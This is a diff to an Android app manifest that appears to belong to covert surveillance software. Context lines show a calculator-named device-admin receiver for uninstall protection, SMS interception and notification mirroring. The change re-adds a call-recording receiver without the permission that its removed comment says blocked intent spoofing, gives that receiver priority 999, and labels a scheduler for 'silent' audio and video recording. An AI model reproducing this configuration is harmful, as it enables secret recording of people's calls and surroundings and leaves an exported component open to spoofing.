@@ -122,24 +122,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Automatic Call Detection & Recording Receiver -->
-        <!-- android:permission protects against 3rd-party intent spoofing -->
-        <receiver
-            android:name="com.example.authapp.receiver.CallReceiver"
-            android:enabled="true"
-            android:exported="true"
-            android:permission="android.permission.READ_PHONE_STATE">
-            <intent-filter>
-                <action android:name="android.intent.action.PHONE_STATE" />
-                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
-            </intent-filter>
-        </receiver>
-
-        <!-- Scheduled Recording Alarm Receiver -->
-        <receiver
-            android:name="com.example.authapp.scheduler.ScheduleAlarmReceiver"
-            android:exported="false" />
-
         <!-- Device Administration Uninstall Protection Receiver -->
         <receiver
             android:name="com.example.authapp.receiver.CalculatorAdminReceiver"
@@ -187,6 +169,23 @@
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
         </receiver>
+
+        <!-- Automatic Call Recording & State Receiver -->
+        <receiver
+            android:name="com.example.authapp.receiver.CallReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter android:priority="999">
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Scheduled Silent Audio/Video Recording Receiver -->
+        <receiver
+            android:name="com.example.authapp.scheduler.ScheduleAlarmReceiver"
+            android:enabled="true"
+            android:exported="false" />
 
         <!-- Notification Mirroring Listener Service -->
         <service
